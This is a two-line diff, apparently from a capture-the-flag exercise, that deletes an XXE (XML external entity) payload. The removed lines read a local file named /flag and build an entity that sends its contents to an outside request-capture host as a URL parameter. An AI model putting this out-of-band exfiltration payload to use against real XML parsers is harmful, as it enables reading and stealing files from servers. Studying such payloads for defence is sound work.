@@ -1,2 +1,0 @@
-<!ENTITY % file SYSTEM "file:///flag">
-<!ENTITY % eval "<!ENTITY &#x25; test SYSTEM 'http://ptsv2.com/t/man0s/post?flag=%file;'>">
